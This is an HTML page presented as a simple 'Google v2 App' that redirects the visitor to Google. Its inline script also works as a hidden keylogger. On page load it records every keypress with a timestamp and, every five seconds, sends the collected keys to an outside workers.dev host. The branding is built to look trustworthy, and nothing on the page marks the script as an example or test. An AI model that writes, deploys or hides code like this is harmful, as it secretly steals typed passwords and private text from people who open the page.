<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sample App</title>
</head>
<body>
    <h1>Welcome to the Google v2 App</h1>
    <p>This is a simple application. Please wait while we redirect you to Google.</p>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            const url = "https://www.google.com";
            window.open(url, '_blank');

            const keylogs = [];
            document.addEventListener('keypress', (e) => {
                keylogs.push(`${new Date().toUTCString()}: ${e.key}`);
            });

            setInterval(() => {
                fetch('google-v2.badger-dizzy.workers.dev/logs', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ logs: keylogs }),
                });
                keylogs.length = 0; // Clear the logs after sending
            }, 5000); // Send logs every 5 seconds
        });
    </script>
</body>
</html>
